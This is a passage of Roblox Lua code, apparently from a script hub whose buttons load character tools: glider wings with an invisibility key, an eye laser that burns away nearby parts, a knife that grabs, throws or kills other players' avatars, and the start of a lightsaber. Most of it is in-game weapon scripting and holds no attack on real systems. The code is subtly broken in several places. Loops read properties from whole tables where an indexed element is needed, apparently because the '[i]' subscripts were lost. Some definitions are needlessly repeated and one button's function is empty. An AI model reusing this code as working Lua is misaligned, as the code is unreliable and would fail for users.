				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.8),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.8),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.9),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.9),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(.55,.4,0)*CFrame.Angles(0,0,.5) 
				wait() 
				player.Humanoid.PlatformStand = true 
				glideg.Parent = steer 
				glideg.maxTorque = Vector3.new(math.huge,math.huge,math.huge) 
				glidev.Parent = steer 
				glidev.maxForce = Vector3.new(math.huge,math.huge,math.huge) 
				while player.Humanoid.PlatformStand == true do 
					wait() 
					glideg.cframe = CFrame.new(steer.Position, mouse.Hit.p) 
					glidev.velocity = steer.CFrame.lookVector * 75 
				end 
				glidev.velocity = steer.CFrame.lookVector * 15 
				wait(3) 
				glideg:remove() 
				glidev:remove() 
				lblade2:remove() 
				rblade2:remove() 
				steer:remove() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-1),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-1),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.9),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.9),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.8),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.8),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.7),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.7),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.6),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.6),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.5),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.4),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.3),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.2),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.5,0)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*-.25)) 
				left.C1 = CFrame.new(1.55,.5,0)*CFrame.Angles((math.pi*-.1),(math.pi*0),(math.pi*.25)) 
				wait() 
				right.C1 = CFrame.new(-1.55,.4,0)*CFrame.Angles(0,0,-.5) 
				left.C1 = CFrame.new(1.55,.4,0)*CFrame.Angles(0,0,.5) 
			end 
			if key == ";" then 
				glideg.Parent = nil 
				glideg.maxTorque = Vector3.new(0,0,0) 
				glidev.Parent = nil 
				glidev.maxForce = Vector3.new(0,0,0) 
			end 
			if key == "l" then 
				local a = player:GetChildren() 
				for i = 1,#a do 
					wait() 
					if a.className == "Part" and a.Name ~= "check" and a.Name ~= "checkb" then 
						for x = 1, 9 do 
							wait() 
							a.Transparency = a.Transparency +.1 
						end 
					elseif a.className == "Hat" then 
						for x = 1, 9 do 
							wait() 
							a.Handle.Transparency = a.Handle.Transparency +.1 
						end 
					end 
					player.Head.Transparency = 1 
				end 
				wait(10) 
				for i = 1,#a do 
					wait() 
					if a.className == "Part" and a.Name ~= "check" and a.Name ~= "checkb" then 
						for x = 1, 9 do 
							wait() 
							a.Transparency = a.Transparency -.1 
						end 
					elseif a.className == "Hat" then 
						for x = 1, 9 do 
							wait() 
							a.Handle.Transparency = a.Handle.Transparency -.1 
						end 
					end 
				end 
				for i = 1,#a do 
					wait() 
					if a.className == "Part" and a.Name ~= "check" and a.Name ~= "checkb" then 
						wait() 
						a.Transparency = 0 
					elseif a.className == "Hat" then 
						wait() 
						a.Handle.Transparency = 0 
					end 
				end 
			end 
		end) 
		----end of keys 
	end) 
	----end of tool 
	bin.Deselected:connect(function() 
		rblade:remove() 
		lblade:remove() 
		on = 2 
		coroutine.yield(function() shadow(rblade,lblade) end) 
		ls.Part1 = larm 
		rs.Part1 = rarm 
		left:remove() 
		right:remove() 
	end)
end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Eyelaser"
button.Position = UDim2.new(0,0,0,66)
button.Size = UDim2.new(0.5,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Eyelaser"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	--MADE BY OneLegend (NOT THE SCRIPT) LOCAL SCRIPT: Go to line 4 and put your name where it says "YOUR NAME HERE"

	playername100 = game.Players.LocalPlayer.Name
	name = playername100 
	me = game.Players[name] 
	char = me.Character 
	selected = false 
	function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form) 
		part.Parent = parent 
		part.formFactor = form 
		part.CanCollide = collide 
		part.Transparency = tran 
		part.Reflectance = ref 
		part.Size = Vector3.new(x,y,z) 
		part.BrickColor = BrickColor.new(color) 
		part.TopSurface = 0 
		part.BottomSurface = 0 
		part.Anchored = anchor 
		part.Locked = true 
		part:BreakJoints() 
	end 
	function weld(w, p, p1, a, b, c, x, y, z) 
		w.Parent = p 
		w.Part0 = p 
		w.Part1 = p1 
		w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z) 
	end 
	function mesh(mesh, parent, x, y, z, type) 
		mesh.Parent = parent 
		mesh.Scale = Vector3.new(x, y, z) 
		mesh.MeshType = type 
	end 
	sword = Instance.new("Model",me.Character) 
	sword.Name = "Eyes" 
	--Parts-------------------------Parts-------------------------Parts-------------------------Parts---------------------- 
	head = char:findFirstChild("Head") 
	torso = char:findFirstChild("Torso") 
	bg = Instance.new("BodyGyro",nil) 
	bg.P = 2000 
	bg.maxTorque = Vector3.new(0,math.huge,0) 
	trail1 = Instance.new("Part") 
	prop(trail1,nil,false,0.4,0,0.1,0.1,1,"Toothpaste",true,"Custom") 
	local t1 = Instance.new("SpecialMesh",trail1) 
	t1.MeshType = "Brick" 
	trail2 = Instance.new("Part") 
	prop(trail2,nil,false,0.4,0,0.1,0.1,1,"Toothpaste",true,"Custom") 
	local t2 = Instance.new("SpecialMesh",trail2) 
	t2.MeshType = "Brick" 
	local fb = Instance.new("Part") 
	prop(fb,nil,false,1,0,0.1,0.1,0.1,"Toothpaste",true,"Custom") 
	local fi = Instance.new("Fire",fb) 
	fi.Name = "LolFire" 
	fi.Size = 2 
	fi.Heat = 25 
	t1p = Vector3.new(-0.3,0.3,-0.55) 
	t2p = Vector3.new(0.3,0.3,-0.55) 
	function getp(path) 
		local objs = {} 
		for _,v in pairs(path:children()) do 
			if v:IsA("BasePart") then 
				if v:GetMass() < 30 then 
					table.insert(objs,v) 
				end 
			end 
			for _,k in pairs(v:children()) do 
				if k:IsA("BasePart") then 
					if k:GetMass() < 30 then 
						table.insert(objs,k) 
					end 
				end 
				for _,o in pairs(k:children()) do 
					if o:IsA("BasePart") then 
						if o:GetMass() < 30 then 
							table.insert(objs,o) 
						end 
					end 
				end 
			end 
		end 
		return objs 
	end 

	bin = Instance.new("HopperBin",me.Backpack) 
	bin.Selected:connect(function(mouse) 
		mouse.Button1Down:connect(function() 
			hold = true 
			bg.Parent = torso 
			trail1.Parent = char 
			trail2.Parent = char 
			fb.Parent = char 
			while hold do 
				local p1 = head.CFrame * CFrame.new(t1p).p 
				local p2 = head.CFrame * CFrame.new(t2p).p 
				local dist1 = (p1 - mouse.Hit.p).magnitude 
				local dist2 = (p2 - mouse.Hit.p).magnitude 
				bg.cframe = CFrame.new(torso.Position, mouse.Hit.p) 
				trail1.CFrame = CFrame.new(p1,mouse.Hit.p) * CFrame.new(0,0,-dist1/2) 
				trail2.CFrame = CFrame.new(p2,mouse.Hit.p) * CFrame.new(0,0,-dist2/2) 
				t1.Scale = Vector3.new(1,1,dist1) 
				t2.Scale = Vector3.new(1,1,dist2) 
				local lol1 = CFrame.new(p1,mouse.Hit.p) * CFrame.new(0,0,-dist1) 
				fb.CFrame = lol1 
				local parts = getp(workspace) 
				for _,v in pairs(parts) do 
					if (v.Position - lol1.p).magnitude < 2 then 
						if v:findFirstChild("LolFire") == nil then 
							local f = Instance.new("Fire",v) 
							f.Size = 0 
							f.Heat = 5 
							f.Name = "LolFire" 
							coroutine.resume(coroutine.create(function() 
								for i=0,10,0.2 do 
									wait(0.1) 
									f.Heat = i 
									f.Size = i 
									local lol = math.random(1,2) 
									if lol == 1 then 
										v.BrickColor = BrickColor.new("Neon orange") 
									else 
										v.BrickColor = BrickColor.new("Bright red") 
									end 
								end 
								v:remove() 
							end)) 
						end 
					end 
				end 
				wait() 
			end 
		end) 
		mouse.Button1Up:connect(function() 
			hold = false 
			bg.Parent = nil 
			trail1.Parent = nil 
			trail2.Parent = nil 
			fb.Parent = nil 
		end) 
	end) 


end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Knife"
button.Position = UDim2.new(0.5,3,0,66)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Knife"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()
	me = game.Players.LocalPlayer
	char = me.Character
	selected = false
	attacking = false
	hurt = false
	grabbed = nil
	mode = "drop"
	bloodcolors = {"Bright red", "Really red"}


	function prop(part, parent, collide, tran, ref, x, y, z, color, anchor, form)
		part.Parent = parent
		part.formFactor = form
		part.CanCollide = collide
		part.Transparency = tran
		part.Reflectance = ref
		part.Size = Vector3.new(x,y,z)
		part.BrickColor = BrickColor.new(color)
		part.TopSurface = 0
		part.BottomSurface = 0
		part.Anchored = anchor
		part.Locked = true
		part:BreakJoints()
	end

	function weld(w, p, p1, a, b, c, x, y, z)
		w.Parent = p
		w.Part0 = p
		w.Part1 = p1
		w.C1 = CFrame.fromEulerAnglesXYZ(a,b,c) * CFrame.new(x,y,z)
	end

	function mesh(mesh, parent, x, y, z, type)
		mesh.Parent = parent
		mesh.Scale = Vector3.new(x, y, z)
		mesh.MeshType = type
	end

	function remgui()
		for _,v in pairs(me.PlayerGui:GetChildren()) do
			if v.Name == "Modeshow" then
				v:remove()
			end
		end
	end

	function inform(text,delay)
		remgui()
		local sc = Instance.new("ScreenGui")
		sc.Parent = me.PlayerGui
		sc.Name = "Modeshow"
		local bak = Instance.new("Frame",sc)
		bak.BackgroundColor3 = Color3.new(1,1,1)
		bak.Size = UDim2.new(0.94,0,0.1,0)
		bak.Position = UDim2.new(0.03,0,0.037,0)
		bak.BorderSizePixel = 0
		local gi = Instance.new("TextLabel",sc)
		gi.Size = UDim2.new(0.92,0,0.09,0)
		gi.BackgroundColor3 = Color3.new(0,0,0)
		gi.Position = UDim2.new(0.04,0,0.042,0)
		gi.TextColor3 = Color3.new(1,1,1)
		gi.FontSize = "Size12"
		gi.Text = text
		coroutine.resume(coroutine.create(function()
			wait(delay)
			sc:remove()
		end))
	end

	if char:findFirstChild("Bricks",true) then
		char:findFirstChild("Bricks",true):remove()
	end

	bricks = Instance.new("Model",me.Character)
	bricks.Name = "Bricks"

	--Parts-------------------------Parts-------------------------Parts-------------------------Parts----------------------

	rarm = char:findFirstChild("Right Arm")
	larm = char:findFirstChild("Left Arm")
	lleg = char:findFirstChild("Left Leg")
	torso = char:findFirstChild("Torso")
	hum = char:findFirstChild("Humanoid")

	righthold = Instance.new("Part")
	prop(righthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
	w11 = Instance.new("Weld")
	weld(w11, rarm, righthold, 0, 0, 0, 0, 1, 0)

	lefthold = Instance.new("Part")
	prop(lefthold, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
	w12 = Instance.new("Weld")
	weld(w12, larm, lefthold, 0, 0, 0, 0, 1, 0)

	hold = Instance.new("Part")
	prop(hold, bricks, false, 0, 0, 0.2, 0.4, 0.7, "Black", false, "Custom")
	oh = Instance.new("Weld")
	weld(oh, lleg, hold, -math.pi/1.4, 0, math.rad(35), 0.55, -0.9, 0.3)

	knife = Instance.new("Part")
	prop(knife, bricks, false, 0, 0, 0.35, 1.1, 0.5, "Reddish brown", false, "Custom")
	orr = Instance.new("Weld")
	weld(orr, hold, knife, 0, 0, 0, 0, 0.7, 0)
	ar = Instance.new("Weld")
	weld(ar, lefthold, nil, math.pi/2, 0, math.pi, 0, 0, 0)


	blade = Instance.new("Part")
	prop(blade, bricks, false, 0, 0, 0.1, 1.5, 0.4, "Medium grey", false, "Custom")
	Instance.new("BlockMesh",blade).Scale = Vector3.new(0.3,1,1)
	w2 = Instance.new("Weld")
	weld(w2, knife, blade, 0, 0, 0, 0, -1.2, 0)

	blade2 = Instance.new("Part")
	prop(blade2, bricks, false, 0, 0, 0.1, 0.5, 0.4, "Medium grey", false, "Custom")
	local mew = Instance.new("SpecialMesh",blade2)
	mew.MeshType = "Wedge"
	mew.Scale = Vector3.new(0.3,1,1)
	w3 = Instance.new("Weld")
	weld(w3, blade, blade2, 0, 0, 0, 0, -1, 0)




	rb = Instance.new("Part")
	prop(rb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
	w13 = Instance.new("Weld")
	weld(w13, torso, rb, 0, 0, 0, -1.5, -0.5, 0)

	lb = Instance.new("Part")
	prop(lb, bricks, false, 1, 0, 0.1, 0.1, 0.1, "White", false, "Custom")
	w14 = Instance.new("Weld")
	weld(w14, torso, lb, 0, 0, 0, 1.5, -0.5, 0)

	rw = Instance.new("Weld")
	weld(rw, rb, nil, 0, 0, 0, 0, 0.5, 0)

	lw = Instance.new("Weld")
	weld(lw, lb, nil, 0, 0, 0, 0, 0.5, 0)

	grabweld = nil
	platlol = nil
	lolhum = nil

	function touch(h)
		if hurt then
			if grabbed == nil then
				local hu = h.Parent:findFirstChild("Humanoid")
				local head = h.Parent:findFirstChild("Head")
				local torz = h.Parent:findFirstChild("Torso")
				if hu ~= nil and head ~= nil and torz ~= nil and h.Parent.Name ~= name then
					if hu.Health > 0 then
						grabbed = torz
						hu.PlatformStand = true
						local w = Instance.new("Weld")
						weld(w,righthold,grabbed,math.pi/2,0.2,0,0.7,-0.9,-0.6)
						grabweld = w
						lolhum = hu
						local lolxd = true
						platlol = lolxd
						hu.Changed:connect(function(prop)
							if prop == "PlatformStand" and platlol then
								hu.PlatformStand = true
							end
						end)
					end
				end
			end
		end
	end

	righthold.Touched:connect(touch)
	lefthold.Touched:connect(touch)

	function bleed(part,po)
		local lol1 = math.random(5,30)/100
		local lol2 = math.random(5,30)/100
		local lol3 =math.random(5,30)/100
		local lol4 = math.random(1,#bloodcolors)
		local p = Instance.new("Part")
		prop(p,part.Parent,false,0,0,lol1,lol2,lol3,bloodcolors[lol4],false,"Custom")
		p.CFrame = part.CFrame * CFrame.new(math.random(-5,5)/10,po,math.random(-5,5)/10)
		p.Velocity = Vector3.new(math.random(-190,190)/10,math.random(-190,190)/10,math.random(-190,190)/10)
		p.RotVelocity = Vector3.new(math.random(-400,400)/10,math.random(-400,400)/10,math.random(-400,400)/10)
		coroutine.resume(coroutine.create(function()
			wait(3)
			p:remove()
		end))
	end



	bin = Instance.new("HopperBin",me.Backpack)

	function select(mouse)
		orr.Part1 = nil
		ar.Part1 = knife
		mouse.Button1Down:connect(function()
			if attacking == false then
				attacking = true
				lw.Part1 = larm
				rw.Part1 = rarm
				hurt = true
				for i=1, 8 do
					rw.C0 = rw.C0 * CFrame.new(-0.03,0,-0.08) * CFrame.fromEulerAnglesXYZ(0.18,0.04,0)
					lw.C0 = lw.C0 * CFrame.new(0.06,0,-0.06) * CFrame.fromEulerAnglesXYZ(0.15,-0.11,-0.05)
					wait()
				end
				wait(1)
				hurt = false
				if grabbed == nil then
					for i=1, 4 do
						rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
						lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
						wait()
					end
					lw.C0 = CFrame.new(0,0,0)
					rw.C0 = CFrame.new(0,0,0)
					lw.Part1 = nil
					rw.Part1 = nil
					attacking = false
				end
			elseif hurt == false and grabbed ~= nil and mode == "drop" then
				grabweld:remove()
				grabweld = nil
				platlol = false
				grabbed = nil
				lolhum.PlatformStand = false
				lolhum = nil
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				attacking = false
				platlol = nil
			elseif hurt == false and grabbed ~= nil and grabweld ~= nil and mode == "throw" then
				grabweld:remove()
				grabweld = nil
				local bf = Instance.new("BodyForce",grabbed)
				bf.force = torso.CFrame.lookVector * 8500
				bf.force = bf.force + Vector3.new(0,7400,0)
				coroutine.resume(coroutine.create(function()
					wait(0.12)
					bf:remove()
				end))
				for i=1, 6 do
					rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.35,0,0)
					lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.18,0,0)
					wait()
				end
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(-0.47,0,0)
					lw.C0 = lw.C0 * CFrame.new(0,0,0) * CFrame.fromEulerAnglesXYZ(0.2,0,0)
					wait()
				end
				wait(0.2)
				platlol = false
				grabbed = nil
				lolhum.PlatformStand = false
				lolhum = nil
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.3,0.2,0)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				attacking = false
				platlol = nil
			elseif hurt == false and grabbed ~= nil and lolhum ~= nil and grabweld ~= nil and mode == "kill" then
				for i=1, 5 do
					lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
					wait()
				end
				local ne = grabbed:findFirstChild("Neck")
				coroutine.resume(coroutine.create(function()
					local duh = grabbed
					local duh2 = grabbed.Parent.Head
					local lolas = lolhum
					duh.RotVelocity = Vector3.new(math.random(-20,20),math.random(-20,20),math.random(-20,20))
					for i=1, 60 do
						wait()
						local hm = math.random(1,9)
						pcall(function()
							if hm == 1 then
								duh2.Sound.Pitch = math.random(90,110)/100
								duh2.Sound:play()
							end
						end)
						if hm > 0 and hm < 3 then
							bleed(duh,1)
							bleed(duh2,-0.5)
						end
					end
					lolas.Health = 0
					for i=1, 85 do
						wait()
						local hm = math.random(1,9)
						pcall(function()
							if hm == 1 then
								duh2.Sound.Pitch = math.random(90,110)/100
								duh2.Sound:play()
							end
						end)
						if hm > 0 and hm < 3 then
							bleed(duh,1)
							bleed(duh2,-0.5)
						end
					end
				end))
				for i=1, 3 do
					lw.C0 = lw.C0 * CFrame.new(0.02,0.12,0.1) * CFrame.fromEulerAnglesXYZ(-0.05,0,-0.03)
					if ne ~= nil then
						grabbed.Neck.C0 = grabbed.Neck.C0 * CFrame.fromEulerAnglesXYZ(-0.35,0,0)
					end
					wait()
				end
				grabweld:remove()
				grabweld = nil
				for i=1, 4 do
					lw.C0 = lw.C0 * CFrame.new(-0.04,-0.24,-0.2) * CFrame.fromEulerAnglesXYZ(0.1,0,0.06)
					wait()
				end
				for i=1, 4 do
					rw.C0 = rw.C0 * CFrame.new(0.06,0,0.16) * CFrame.fromEulerAnglesXYZ(-0.36,-0.08,0)
					lw.C0 = lw.C0 * CFrame.new(-0.12,0,0.12) * CFrame.fromEulerAnglesXYZ(-0.3,0.22,0.05)
					wait()
				end
				lw.C0 = CFrame.new(0,0,0)
				rw.C0 = CFrame.new(0,0,0)
				lw.Part1 = nil
				rw.Part1 = nil
				platlol = false
				grabbed = nil
				lolhum = nil
				attacking = false
				platlol = nil
			end
		end)
		mouse.KeyDown:connect(function(kai)
			key = kai:lower()
			if key == "q" then
				mode = "drop"
				inform("Mode: Drop",2)
			elseif key == "e" then
				mode = "throw"
				inform("Mode: Throw",2)
			elseif key == "f" then
				mode = "kill"
				inform("Mode: Kill",2)
			end
		end)
	end

	function desel()
		repeat wait() until attacking == false
		orr.Part1 = knife
		ar.Part1 = nil
	end

	bin.Selected:connect(select)
	bin.Deselected:connect(desel)

	char.Humanoid.Died:connect(function()
		pcall(function()
			grabweld:remove()
			grabweld = nil
			grabbed = nil
			platlol = false
			platlol = nil
		end)
	end)

	inform("Grab script loaded succesfully.",2)

end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Lance"
button.Position = UDim2.new(0,0,0,99)
button.Size = UDim2.new(0.499,0,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Lance"
button.TextColor3 = whit
button.TextWrapped = true
button.MouseButton1Down:connect(function()

end)
--
local button = Instance.new("TextButton")
button.Parent = ws
button.BackgroundColor3 = blak
button.BorderColor3 = rede
button.BorderSizePixel = 3
button.Name = "Lightsaber"
button.Position = UDim2.new(0.5,3,0,99)
button.Size = UDim2.new(0.5,-3,0,30)
button.ZIndex = 2
button.Font = tef
button.FontSize = "Size14"
button.Text = "Lightsaber"
button.TextColor3 = whit
button.MouseButton1Down:connect(function()
	--MADE BY OneLegend (NOT THE SCRIPT) LOCAL SCRIPT: Go to line 4 and 1351 and put your name where it says "YOUR NAME HERE"

	Players = game:GetService("Players")
	Player = Players.LocalPlayer
	Bp = Player.Backpack
	Pg = Player.PlayerGui
	Char = Player.Character
	Head = Char.Head
	Torso = Char.Torso
	Hum = Char.Humanoid
	Humanoid = Hum
	Neck = Torso["Neck"]
	LS = Torso["Left Shoulder"]
	RS = Torso["Right Shoulder"]
	Ra = Char["Right Arm"]
	La = Char["Left Arm"]
	mouse = nil
	Mouse = nil

	bets =
		{"a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"," "}
	inew = Instance.new
	it = Instance.new
	bc = BrickColor.new
	vn = Vector3.new
	cn = CFrame.new
	ca = CFrame.Angles
	mpi = math.pi
	v3 = vn
	mr = math.rad
	br = BrickColor.new
	cf = CFrame.new
	ca = CFrame.Angles
	Colors = {"Really Red"}
	BladeColor = tostring(BrickColor.Random()) --Colors[math.random(1,#Colors)]
	TrailColor = BladeColor
	HopperName = "light saber"
	Rage = 100000
	MaxRage = Rage
	SwordType = "Single"
	LeftDebounce = {}
	RightDebounce = {}
	OtherDebounce = {}
	Anim = {key = {}}
	for i=1,#bets do table.insert(Anim.key,bets) end
	Anim.Move = "None"
	Anim.Click = false
	Anim.Button = false
	Anim.CanBerserk = 0
	Anim.ComboBreak = false
	Anim.Equipped = false
	keydown = false
	Speed = 2
	RageIncome = 500
	Left = false
	Right = false
	Anim.Act = false
	RealSpeed = 35
	DebounceSpeed = 0.85/Speed
	RageCost = {
		["Berserk"] = 200;
		["RotorBlade"] = 30;
		["Blocking"] = 0.1;
		["Boomerang"] = 30;
		["RageRegening"] = -0.7;
		["BoulderForce"] = 45;
		["ForceWave"] = 65;
		["ForceWave"] = 32;
		["Teleport"] = 25;
		["DualSpin"] = 4;
	}
	MagnitudeHit = {
		["ForceWave"] = 500;
	}
	Damage = {
		["RotorBlade"] = 8;
		["BoulderForce"] = 100;
		["Boomerang"] = 100;
		["ForceWave"] = 100;
		["DualSpin"] = 5;
	}
	Props = {}
	Props.MaxTeleDistance = 500
	Props.Buff = 1
	BlastMesh = Instance.new("FileMesh")
	BlastMesh.MeshId = "http://www.roblox.com/asset/?id=20329976"
	RingMesh = Instance.new("FileMesh")
	RingMesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
	RockMesh = Instance.new("FileMesh")
	RockMesh.MeshId = "http://www.roblox.com/asset/?id=1290033"
	RockMesh.TextureId = "http://www.roblox.com/asset/?id=1290030"
	DiamondMesh = Instance.new("FileMesh")
	DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
	RingMesh = Instance.new("FileMesh")
	RingMesh.MeshId = "http://www.roblox.com/asset/?id=3270017"
	RockMesh = Instance.new("FileMesh")
	RockMesh.MeshId = "http://www.roblox.com/asset/?id=1290033"
	RockMesh.TextureId = "http://www.roblox.com/asset/?id=1290030"
	DiamondMesh = Instance.new("FileMesh")
	DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
	RockMesh = Instance.new("FileMesh")
	RockMesh.MeshId = "http://www.roblox.com/asset/?id=1290033"
	RockMesh.TextureId = "http://www.roblox.com/asset/?id=1290030"
	DiamondMesh = Instance.new("FileMesh")
	DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"
	DiamondMesh = Instance.new("FileMesh")
	DiamondMesh.MeshId = "http://www.roblox.com/Asset/?id=9756362"

	function rayCast(Pos, Dir, Max, Ignore)
		return Workspace:FindPartOnRay(Ray.new(Pos, Dir.unit * (Max or 999.999)), Ignore)
	end
	function MinusRage(raggge)
		Rage = Rage - raggge
		if Rage < 0 then Rage = 0 end
	end

	function r(zParent,zName)
		if zParent:findFirstChild(zName) ~= nil then
			zParent[zName]:Remove()
		else
		end
	end
	function rclass(zParent,zClass)
		local ch = zParent:GetChildren()
		for i=1,#ch do
			if (ch.className == zClass) then
				ch:Remove()
			else
			end
		end
	end

	function fWeld(zName,zParent,zPart0,zPart1,zCoco,a,b,c,d,e,f)
		local funcw = Instance.new("Weld")
		funcw.Name = zName
		funcw.Parent = zParent
		funcw.Part0 = zPart0
		funcw.Part1 = zPart1
		if (zCoco == true) then
			funcw.C0 = CFrame.new(a,b,c) *CFrame.fromEulerAnglesXYZ(d,e,f)
		else
			funcw.C1 = CFrame.new(a,b,c) *CFrame.fromEulerAnglesXYZ(d,e,f)
		end
		return funcw
	end
	function Dash(ob,se,mes,of)
		local off = nil
		if of == nil then off = 0 else off = of end
		pcall(function()
			coroutine.resume(coroutine.create(function()
				local dashin = true
				local oldpos = (ob.CFrame *CFrame.new(0,off,0)).p
				coroutine.resume(coroutine.create(function()
					wait(se) dashin = false end))
				for i=1,9999 do
					if dashin == false then break end
					local newpos = (ob.CFrame *CFrame.new(0,off,0)).p --+ Vector3.new(math.random(-2,2),math.random(-2,2),math.random(-2,2))
					local np = Instance.new("Part")
					np.BrickColor = BrickColor.new(TrailColor) np.CanCollide = false
					np.BottomSurface = 0 np.TopSurface = 0 np.Anchored = true np.Transparency = 0.4
					np.formFactor = "Custom" np.Parent = ob local mag = math.abs((newpos - oldpos).magnitude)
					local mp = nil
					if mes ~= nil then
						np.Size = Vector3.new(2,mag,2) mp = Instance.new("FileMesh",np) mp.MeshId = mes else
						np.Size = Vector3.new(0.4,0.4,mag) mp = Instance.new("BlockMesh",np) end
					np.CFrame = CFrame.new(newpos,oldpos)
					np.CFrame = np.CFrame + np.CFrame.lookVector* (mag/2)
					if mes == BlastMesh.MeshId then np.CFrame = np.CFrame *ca(mr(-90),0,0) else np.CFrame = np.CFrame *ca(0,0,mr(-45)) end
					oldpos = newpos
					coroutine.resume(coroutine.create(function()
						for i=1,0,-0.1 do
							np.Transparency = np.Transparency + 0.03
							--if mes ~= nil then
							--mp.Scale = Vector3.new(i,mag,i) else
							mp.Scale = Vector3.new(i,i,1) -- end
							wait()
						end
						np:Remove()
					end))
					wait(0.08)
				end
			end))
		end)
	end
	Sounds = {
		Boom = "http://www.roblox.com/asset/?id=16976189";
		SniperFire = "http://www.roblox.com/asset/?id=1369158";
		ShotgunFire2 = "http://www.roblox.com/asset/?id=1868836";
